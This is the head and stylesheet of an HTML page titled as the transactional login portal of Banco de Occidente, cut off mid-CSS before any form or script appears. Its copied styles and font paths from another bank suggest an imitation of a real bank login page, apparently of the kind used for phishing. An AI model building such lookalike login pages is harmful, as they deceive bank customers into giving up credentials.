<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso al Portal Transaccional | Banco de Occidente</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <style>
        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Regular.eot);
            src: url(/popular/Inter-Regular.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-Regular.woff2) format("woff2"),
                url(/popular/Inter-Regular.woff) format("woff"),
                url(/popular/Inter-Regular.ttf) format("truetype"),
                url(/popular/Inter-Regular.svg#Inter-Regular) format("svg");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Italic.eot);
            src: url(/popular/Inter-Italic.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-Italic.woff2) format("woff2"),
                url(/popular/Inter-Italic.woff) format("woff"),
                url(/popular/Inter-Italic.ttf) format("truetype"),
                url(/popular/Inter-Italic.svg#Inter-Italic) format("svg");
            font-weight: 400;
            font-style: italic;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Bold.eot);
            src: url(/popular/Inter-Bold.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-Bold.woff2) format("woff2"),
                url(/popular/Inter-Bold.woff) format("woff"),
                url(/popular/Inter-Bold.ttf) format("truetype"),
                url(/popular/Inter-Bold.svg#Inter-Bold) format("svg");
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-ExtraBold.eot);
            src: url(/popular/Inter-ExtraBold.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-ExtraBold.woff2) format("woff2"),
                url(/popular/Inter-ExtraBold.woff) format("woff"),
                url(/popular/Inter-ExtraBold.ttf) format("truetype"),
                url(/popular/Inter-ExtraBold.svg#Inter-ExtraBold) format("svg");
            font-weight: 800;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Black.eot);
            src: url(/popular/Inter-Black.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-Black.woff2) format("woff2"),
                url(/popular/Inter-Black.woff) format("woff"),
                url(/popular/Inter-Black.ttf) format("truetype"),
                url(/popular/Inter-Black.svg#Inter-Black) format("svg");
            font-weight: 900;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-Medium.eot);
            src: url(/popular/Inter-Medium.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-Medium.woff2) format("woff2"),
                url(/popular/Inter-Medium.woff) format("woff"),
                url(/popular/Inter-Medium.ttf) format("truetype"),
                url(/popular/Inter-Medium.svg#Inter-Medium) format("svg");
            font-weight: 500;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-LightBETA.eot);
            src: url(/popular/Inter-LightBETA.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-LightBETA.woff2) format("woff2"),
                url(/popular/Inter-LightBETA.woff) format("woff"),
                url(/popular/Inter-LightBETA.ttf) format("truetype"),
                url(/popular/Inter-LightBETA.svg#Inter-LightBETA) format("svg");
            font-weight: 300;
            font-style: normal;
        }

        @font-face {
            font-family: Inter;
            src: url(/popular/Inter-SemiBold.eot);
            src: url(/popular/Inter-SemiBold.eot?#iefix) format("embedded-opentype"),
                url(/popular/Inter-SemiBold.woff2) format("woff2"),
                url(/popular/Inter-SemiBold.woff) format("woff"),
                url(/popular/Inter-SemiBold.ttf) format("truetype"),
                url(/popular/Inter-SemiBold.svg#Inter-SemiBold) format("svg");
            font-weight: 600;
            font-style: normal;
        }

        .texto-1 {

            visibility: inherit;
            --scanovate-card-capture-loader-url: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' style='margin: auto; background: none; display: block; shape-rendering: auto;' width='50px' height='50px' viewBox='0 0 100 100' preserveAspectRatio='xMidYMid'%3E%3Ccircle cx='50' cy='50' fill='none' stroke='%230050ff' stroke-width='10' r='21' stroke-dasharray='98.96016858807849 34.98672286269283' transform='rotate(293.95 50 50)'%3E%3CanimateTransform attributeName='transform' type='rotate' repeatCount='indefinite' dur='1s' values='0 50 50;360 50 50' keyTimes='0;1'/%3E%3C/circle%3E%3C!-- %5Bldio%5D generated by https://loading.io/ --%3E%3C/svg%3E");
            --scanovate-liveness-right-arrow-url: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTdweCIgaGVpZ2h0PSIyNnB4IiB2aWV3Qm94PSIwIDAgMTcgMjYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogc2tldGNodG9vbCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+OTExRTY4REUtNjI1MS00QTA5LTg5QzEtOEVGRjZEM0JEM0RBPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBza2V0Y2h0b29sLjwvZGVzYz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpbnN0cmFjdGlvbnNfdHVybl9sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTcuMDAwMDAwLCAtMzUwLjAwMDAwMCkiIGZpbGw9IiMwMDU3RkYiPgogICAgICAgICAgICA8ZyBpZD0iYXJyb3dfbGVmdCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTcuOTAwMDAwLCAzNTAuMjAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC4xNDY3ODUxLDUuNjUwMDYxMSBDMTkuNDMyODI5OSw0LjkyNzQxNjYxIDE4LjI2NjI2MTgsNC45NTM0MjIzNiAxNy41NTk4MzI4LDUuNjY4NDQ5IEMxNy4zNjkzNDEsNS44NjEyNTkyNyA3LjgxMTI2ODY3LDE1LjUzODI4NTkgNy43MDI1MjczOSwxNS42NDgwODc5IEM2LjA4MTI3MDMsMTQuMDA2NTczOCAtMC41MDAwNDIxMzUsNy4zNDMzMjQwNCAtMi4xNjkzMTE0OSw1LjY1MzQ3NTk5IEMtMi45OTE3NDg0Niw0LjgyMDc2Njc5IC00LjQwOTUzNzQsNC45OTAxOTgxNiAtNS4wMTI2NzUxNSw2LjAwMDQ4MTk0IEMtNS40NjAwOTc0Nyw2Ljc0OTkyMDIyIC01LjMwMTI2NzczLDcuNjg0MDI1NTYgLTQuNzAxNTAzODIsOC4yOTEzNTE2NCBDLTQuMTE3NTcwOTgsOC44ODIzOTEzIDUuNDA1MjA1ODMsMTguNTIzNDMwMSA2LjE2NDU3ODA1LDE5LjI5MjMwNzEgQzYuMzYzODkzNzksMTkuNDk0MDQ4NiA2LjU1MTc5MDQsMTkuNjkzOTUxMyA2Ljc5NzMwMTcyLDE5Ljg0MjYzMDcgQzcuNTE1MTQ5ODMsMjAuMjc2ODQ3OCA4LjQzNjQ2NjEsMjAuMTA2MzY1NyA5LjAxMzkxMDgsMTkuNTIxODkzMSBDMTAuNjc1OTEzNCwxNy44MzkxMzc2IDIwLjA0OTcyMjUsOC4zNDg4Nzk1IDIwLjE0NjUyNTYsOC4yNTExNjA5NSBDMjAuODQ2NzI1OSw3LjU0MjE3NjA0IDIwLjg0NzUwNDUsNi4zNTkwNDYgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEgQzE5LjQzNzUwMTMsNC45MzI0MDc2MSAyMC44NTYzMjg0LDYuMzY4MjM5OTUgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEiIGlkPSJhcnJvd19sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3LjcwMTMzNCwgMTIuNjAzMDc3KSBzY2FsZSgxLCAtMSkgcm90YXRlKC0yNzAuMDAwMDAwKSB0cmFuc2xhdGUoLTcuNzAxMzM0LCAtMTIuNjAzMDc3KSAiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+');
            --scanovate-card-capture-back-arrow-color: white;
            --scanovate-card-capture-font: none;
            --scanovate-card-capture-loader-color: white;
            --scanovate-card-capture-popup-text-color: black;
            --scanovate-card-capture-primary-color: green;
            --scanovate-card-capture-popup-background-color: white;
            --scanovate-card-capture-instructions-background-color: black;
            --scanovate-card-capture-instructions-text-color: white;
            --n-100: #e9e9e9;
            --n-50: #f5f5f5;
            --n-200: #d9d9d9;
            --n-400: #9d9d9d;
            --n-300: #c4c4c4;
            --gray-3: #676767;
            --black-900: #000000;
            --white: #ffffff;
            --green-500: #11b719;
            --gb-500: #f5fdf4;
            --g-50: #d7f4d4;
            --s-900: #006e00;
            --green-corpo-600: #009a48;
            font-family: Inter, sans-serif;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
            outline: 0;
            padding: 0;
            border: 0;
            vertical-align: baseline;
            line-height: 1.25;
            font-size: 16px;
            letter-spacing: -.42px;
            margin: 43px 0;
            font-weight: 400;

        }

        .entrada-1 {

            visibility: inherit;
            --scanovate-card-capture-loader-url: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' style='margin: auto; background: none; display: block; shape-rendering: auto;' width='50px' height='50px' viewBox='0 0 100 100' preserveAspectRatio='xMidYMid'%3E%3Ccircle cx='50' cy='50' fill='none' stroke='%230050ff' stroke-width='10' r='21' stroke-dasharray='98.96016858807849 34.98672286269283' transform='rotate(293.95 50 50)'%3E%3CanimateTransform attributeName='transform' type='rotate' repeatCount='indefinite' dur='1s' values='0 50 50;360 50 50' keyTimes='0;1'/%3E%3C/circle%3E%3C!-- %5Bldio%5D generated by https://loading.io/ --%3E%3C/svg%3E");
            --scanovate-liveness-right-arrow-url: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTdweCIgaGVpZ2h0PSIyNnB4IiB2aWV3Qm94PSIwIDAgMTcgMjYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogc2tldGNodG9vbCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+OTExRTY4REUtNjI1MS00QTA5LTg5QzEtOEVGRjZEM0JEM0RBPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBza2V0Y2h0b29sLjwvZGVzYz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpbnN0cmFjdGlvbnNfdHVybl9sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTcuMDAwMDAwLCAtMzUwLjAwMDAwMCkiIGZpbGw9IiMwMDU3RkYiPgogICAgICAgICAgICA8ZyBpZD0iYXJyb3dfbGVmdCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTcuOTAwMDAwLCAzNTAuMjAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC4xNDY3ODUxLDUuNjUwMDYxMSBDMTkuNDMyODI5OSw0LjkyNzQxNjYxIDE4LjI2NjI2MTgsNC45NTM0MjIzNiAxNy41NTk4MzI4LDUuNjY4NDQ5IEMxNy4zNjkzNDEsNS44NjEyNTkyNyA3LjgxMTI2ODY3LDE1LjUzODI4NTkgNy43MDI1MjczOSwxNS42NDgwODc5IEM2LjA4MTI3MDMsMTQuMDA2NTczOCAtMC41MDAwNDIxMzUsNy4zNDMzMjQwNCAtMi4xNjkzMTE0OSw1LjY1MzQ3NTk5IEMtMi45OTE3NDg0Niw0LjgyMDc2Njc5IC00LjQwOTUzNzQsNC45OTAxOTgxNiAtNS4wMTI2NzUxNSw2LjAwMDQ4MTk0IEMtNS40NjAwOTc0Nyw2Ljc0OTkyMDIyIC01LjMwMTI2NzczLDcuNjg0MDI1NTYgLTQuNzAxNTAzODIsOC4yOTEzNTE2NCBDLTQuMTE3NTcwOTgsOC44ODIzOTEzIDUuNDA1MjA1ODMsMTguNTIzNDMwMSA2LjE2NDU3ODA1LDE5LjI5MjMwNzEgQzYuMzYzODkzNzksMTkuNDk0MDQ4NiA2LjU1MTc5MDQsMTkuNjkzOTUxMyA2Ljc5NzMwMTcyLDE5Ljg0MjYzMDcgQzcuNTE1MTQ5ODMsMjAuMjc2ODQ3OCA4LjQzNjQ2NjEsMjAuMTA2MzY1NyA5LjAxMzkxMDgsMTkuNTIxODkzMSBDMTAuNjc1OTEzNCwxNy44MzkxMzc2IDIwLjA0OTcyMjUsOC4zNDg4Nzk1IDIwLjE0NjUyNTYsOC4yNTExNjA5NSBDMjAuODQ2NzI1OSw3LjU0MjE3NjA0IDIwLjg0NzUwNDUsNi4zNTkwNDYgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEgQzE5LjQzNzUwMTMsNC45MzI0MDc2MSAyMC44NTYzMjg0LDYuMzY4MjM5OTUgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEiIGlkPSJhcnJvd19sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3LjcwMTMzNCwgMTIuNjAzMDc3KSBzY2FsZSgxLCAtMSkgcm90YXRlKC0yNzAuMDAwMDAwKSB0cmFuc2xhdGUoLTcuNzAxMzM0LCAtMTIuNjAzMDc3KSAiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+');
            --scanovate-card-capture-back-arrow-color: white;
            --scanovate-card-capture-font: none;
            --scanovate-card-capture-loader-color: white;
            --scanovate-card-capture-popup-text-color: black;
            --scanovate-card-capture-primary-color: green;
            --scanovate-card-capture-popup-background-color: white;
            --scanovate-card-capture-instructions-background-color: black;
            --scanovate-card-capture-instructions-text-color: white;
            --n-100: #e9e9e9;
            --n-50: #f5f5f5;
            --n-200: #d9d9d9;
            --n-400: #9d9d9d;
            --n-300: #c4c4c4;
            --gray-3: #676767;
            --black-900: #000000;
            --white: #ffffff;
            --green-500: #11b719;
            --gb-500: #f5fdf4;
            --g-50: #d7f4d4;
            --s-900: #006e00;
            --green-corpo-600: #009a48;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
            margin: 0;
            font-size: 100%;
            vertical-align: baseline;
            outline: 0;
            width: 100%;
            height: 48px;
            padding: 5px 10px;
            border-radius: 8px;
            background: #fff;
            transition: .3s;
            appearance: none;
            font-family: Inter, sans-serif;
            border: 1px solid #d9d9d9;

        }

        .boton-1 {

            visibility: inherit;
            --scanovate-card-capture-loader-url: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' style='margin: auto; background: none; display: block; shape-rendering: auto;' width='50px' height='50px' viewBox='0 0 100 100' preserveAspectRatio='xMidYMid'%3E%3Ccircle cx='50' cy='50' fill='none' stroke='%230050ff' stroke-width='10' r='21' stroke-dasharray='98.96016858807849 34.98672286269283' transform='rotate(293.95 50 50)'%3E%3CanimateTransform attributeName='transform' type='rotate' repeatCount='indefinite' dur='1s' values='0 50 50;360 50 50' keyTimes='0;1'/%3E%3C/circle%3E%3C!-- %5Bldio%5D generated by https://loading.io/ --%3E%3C/svg%3E");
            --scanovate-liveness-right-arrow-url: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTdweCIgaGVpZ2h0PSIyNnB4IiB2aWV3Qm94PSIwIDAgMTcgMjYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogc2tldGNodG9vbCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+OTExRTY4REUtNjI1MS00QTA5LTg5QzEtOEVGRjZEM0JEM0RBPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBza2V0Y2h0b29sLjwvZGVzYz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpbnN0cmFjdGlvbnNfdHVybl9sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTcuMDAwMDAwLCAtMzUwLjAwMDAwMCkiIGZpbGw9IiMwMDU3RkYiPgogICAgICAgICAgICA8ZyBpZD0iYXJyb3dfbGVmdCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTcuOTAwMDAwLCAzNTAuMjAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC4xNDY3ODUxLDUuNjUwMDYxMSBDMTkuNDMyODI5OSw0LjkyNzQxNjYxIDE4LjI2NjI2MTgsNC45NTM0MjIzNiAxNy41NTk4MzI4LDUuNjY4NDQ5IEMxNy4zNjkzNDEsNS44NjEyNTkyNyA3LjgxMTI2ODY3LDE1LjUzODI4NTkgNy43MDI1MjczOSwxNS42NDgwODc5IEM2LjA4MTI3MDMsMTQuMDA2NTczOCAtMC41MDAwNDIxMzUsNy4zNDMzMjQwNCAtMi4xNjkzMTE0OSw1LjY1MzQ3NTk5IEMtMi45OTE3NDg0Niw0LjgyMDc2Njc5IC00LjQwOTUzNzQsNC45OTAxOTgxNiAtNS4wMTI2NzUxNSw2LjAwMDQ4MTk0IEMtNS40NjAwOTc0Nyw2Ljc0OTkyMDIyIC01LjMwMTI2NzczLDcuNjg0MDI1NTYgLTQuNzAxNTAzODIsOC4yOTEzNTE2NCBDLTQuMTE3NTcwOTgsOC44ODIzOTEzIDUuNDA1MjA1ODMsMTguNTIzNDMwMSA2LjE2NDU3ODA1LDE5LjI5MjMwNzEgQzYuMzYzODkzNzksMTkuNDk0MDQ4NiA2LjU1MTc5MDQsMTkuNjkzOTUxMyA2Ljc5NzMwMTcyLDE5Ljg0MjYzMDcgQzcuNTE1MTQ5ODMsMjAuMjc2ODQ3OCA4LjQzNjQ2NjEsMjAuMTA2MzY1NyA5LjAxMzkxMDgsMTkuNTIxODkzMSBDMTAuNjc1OTEzNCwxNy44MzkxMzc2IDIwLjA0OTcyMjUsOC4zNDg4Nzk1IDIwLjE0NjUyNTYsOC4yNTExNjA5NSBDMjAuODQ2NzI1OSw3LjU0MjE3NjA0IDIwLjg0NzUwNDUsNi4zNTkwNDYgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEgQzE5LjQzNzUwMTMsNC45MzI0MDc2MSAyMC44NTYzMjg0LDYuMzY4MjM5OTUgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEiIGlkPSJhcnJvd19sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3LjcwMTMzNCwgMTIuNjAzMDc3KSBzY2FsZSgxLCAtMSkgcm90YXRlKC0yNzAuMDAwMDAwKSB0cmFuc2xhdGUoLTcuNzAxMzM0LCAtMTIuNjAzMDc3KSAiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+');
            --scanovate-card-capture-back-arrow-color: white;
            --scanovate-card-capture-font: none;
            --scanovate-card-capture-loader-color: white;
            --scanovate-card-capture-popup-text-color: black;
            --scanovate-card-capture-primary-color: green;
            --scanovate-card-capture-popup-background-color: white;
            --scanovate-card-capture-instructions-background-color: black;
            --scanovate-card-capture-instructions-text-color: white;
            --n-100: #e9e9e9;
            --n-50: #f5f5f5;
            --n-200: #d9d9d9;
            --n-400: #9d9d9d;
            --n-300: #c4c4c4;
            --gray-3: #676767;
            --black-900: #000000;
            --white: #ffffff;
            --green-500: #11b719;
            --gb-500: #f5fdf4;
            --g-50: #d7f4d4;
            --s-900: #006e00;
            --green-corpo-600: #009a48;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
            border: 0;
            vertical-align: baseline;
            outline: 0;
            height: 48px;
            line-height: 20px;
            font-family: Inter, sans-serif;
            font-size: 14px;
            transition: .3s;
            letter-spacing: 0;
            cursor: pointer;
            padding: 14px 32px;
            user-select: none;
            font-weight: 600;
            font-style: normal;
            background: #00b800;
            color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 0 0 rgba(17, 183, 25, 0);
            width: 100%;
            margin: 10px 0 32px;

        }

        .label-1 {


            visibility: inherit;
            --scanovate-card-capture-loader-url: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' style='margin: auto; background: none; display: block; shape-rendering: auto;' width='50px' height='50px' viewBox='0 0 100 100' preserveAspectRatio='xMidYMid'%3E%3Ccircle cx='50' cy='50' fill='none' stroke='%230050ff' stroke-width='10' r='21' stroke-dasharray='98.96016858807849 34.98672286269283' transform='rotate(293.95 50 50)'%3E%3CanimateTransform attributeName='transform' type='rotate' repeatCount='indefinite' dur='1s' values='0 50 50;360 50 50' keyTimes='0;1'/%3E%3C/circle%3E%3C!-- %5Bldio%5D generated by https://loading.io/ --%3E%3C/svg%3E");
            --scanovate-liveness-right-arrow-url: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTdweCIgaGVpZ2h0PSIyNnB4IiB2aWV3Qm94PSIwIDAgMTcgMjYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogc2tldGNodG9vbCA1Mi41ICg2NzQ2OSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+OTExRTY4REUtNjI1MS00QTA5LTg5QzEtOEVGRjZEM0JEM0RBPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBza2V0Y2h0b29sLjwvZGVzYz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpbnN0cmFjdGlvbnNfdHVybl9sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTcuMDAwMDAwLCAtMzUwLjAwMDAwMCkiIGZpbGw9IiMwMDU3RkYiPgogICAgICAgICAgICA8ZyBpZD0iYXJyb3dfbGVmdCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTcuOTAwMDAwLCAzNTAuMjAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC4xNDY3ODUxLDUuNjUwMDYxMSBDMTkuNDMyODI5OSw0LjkyNzQxNjYxIDE4LjI2NjI2MTgsNC45NTM0MjIzNiAxNy41NTk4MzI4LDUuNjY4NDQ5IEMxNy4zNjkzNDEsNS44NjEyNTkyNyA3LjgxMTI2ODY3LDE1LjUzODI4NTkgNy43MDI1MjczOSwxNS42NDgwODc5IEM2LjA4MTI3MDMsMTQuMDA2NTczOCAtMC41MDAwNDIxMzUsNy4zNDMzMjQwNCAtMi4xNjkzMTE0OSw1LjY1MzQ3NTk5IEMtMi45OTE3NDg0Niw0LjgyMDc2Njc5IC00LjQwOTUzNzQsNC45OTAxOTgxNiAtNS4wMTI2NzUxNSw2LjAwMDQ4MTk0IEMtNS40NjAwOTc0Nyw2Ljc0OTkyMDIyIC01LjMwMTI2NzczLDcuNjg0MDI1NTYgLTQuNzAxNTAzODIsOC4yOTEzNTE2NCBDLTQuMTE3NTcwOTgsOC44ODIzOTEzIDUuNDA1MjA1ODMsMTguNTIzNDMwMSA2LjE2NDU3ODA1LDE5LjI5MjMwNzEgQzYuMzYzODkzNzksMTkuNDk0MDQ4NiA2LjU1MTc5MDQsMTkuNjkzOTUxMyA2Ljc5NzMwMTcyLDE5Ljg0MjYzMDcgQzcuNTE1MTQ5ODMsMjAuMjc2ODQ3OCA4LjQzNjQ2NjEsMjAuMTA2MzY1NyA5LjAxMzkxMDgsMTkuNTIxODkzMSBDMTAuNjc1OTEzNCwxNy44MzkxMzc2IDIwLjA0OTcyMjUsOC4zNDg4Nzk1IDIwLjE0NjUyNTYsOC4yNTExNjA5NSBDMjAuODQ2NzI1OSw3LjU0MjE3NjA0IDIwLjg0NzUwNDUsNi4zNTkwNDYgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEgQzE5LjQzNzUwMTMsNC45MzI0MDc2MSAyMC44NTYzMjg0LDYuMzY4MjM5OTUgMjAuMTQ2Nzg1MSw1LjY1MDA2MTEiIGlkPSJhcnJvd19sZWZ0IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3LjcwMTMzNCwgMTIuNjAzMDc3KSBzY2FsZSgxLCAtMSkgcm90YXRlKC0yNzAuMDAwMDAwKSB0cmFuc2xhdGUoLTcuNzAxMzM0LCAtMTIuNjAzMDc3KSAiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+');
            --scanovate-card-capture-back-arrow-color: white;
            --scanovate-card-capture-font: none;
            --scanovate-card-capture-loader-color: white;
            --scanovate-card-capture-popup-text-color: black;
            --scanovate-card-capture-primary-color: green;
            --scanovate-card-capture-popup-background-color: white;
            --scanovate-card-capture-instructions-background-color: black;
            --scanovate-card-capture-instructions-text-color: white;
            --n-100: #e9e9e9;
            --n-50: #f5f5f5;
            --n-200: #d9d9d9;
            --n-400: #9d9d9d;
            --n-300: #c4c4c4;
            --gray-3: #676767;
            --black-900: #000000;
            --white: #ffffff;
            --green-500: #11b719;
            --gb-500: #f5fdf4;
            --g-50: #d7f4d4;
            --s-900: #006e00;
            --green-corpo-600: #009a48;
            font-family: Inter, sans-serif;
            -webkit-font-smoothing: antialiased;
            -webkit-tap-highlight-color: transparent;
            text-align: left;
            box-sizing: border-box;
            outline: 0;
            margin: 0;
            padding: 0;
            border: 0;
            font-weight: 400;
            display: block;
            margin-bottom: 5px;
            font-size: 12px;

        }

        .select-1 {


            visibility: inherit;
            --scanovate-card-capture-loader-url: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' style='margin: auto; background: none; display: block; shape-rendering: auto;' width='50px' height='50px' viewBox='0 0 100 100' preserveAspectRatio='xMidYMid'%3E%3Ccircle cx='50' cy='50' fill='none' stroke='%230050ff' stroke-width='10' r='21' stroke-dasharray='98.96016858807849 34.98672286269283' transform='rotate(293.95 50 50)'%3E%3CanimateTransform attributeName='transform' type='rotate' repeatCount='indefinite' dur='1s' values='0 50 50;360 50 50' keyTimes='0;1'/%3E%3C/circle%3E%3C!-- %5Bldio%5D generated by https://loading.io/ --%3E%3C/svg%3E");
